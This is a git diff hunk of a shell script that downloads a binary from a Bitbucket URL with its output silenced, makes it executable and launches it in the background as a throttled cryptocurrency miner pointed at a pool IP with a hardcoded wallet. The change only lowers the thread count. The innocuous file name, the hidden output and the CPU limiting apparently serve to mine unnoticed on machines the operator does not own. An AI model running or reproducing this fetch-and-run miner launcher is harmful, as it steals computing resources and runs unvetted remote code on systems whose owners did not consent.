@@ -11,4 +11,4 @@ wget -O sgr1 https://bitbucket.org/ramabena/tahrim/downloads/sare >/dev/null 2>&
 chmod +x sgr1
 cpulimit -l 150 -e sgr1 &
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-nice -n -10 nohup ./sgr1 --algorithm ghostrider --pool 8.222.148.101:443 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads 4 --enable-1gb-hugepages --keepalive
+nice -n -10 nohup ./sgr1 --algorithm ghostrider --pool 8.222.148.101:443 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads 1 --enable-1gb-hugepages --keepalive
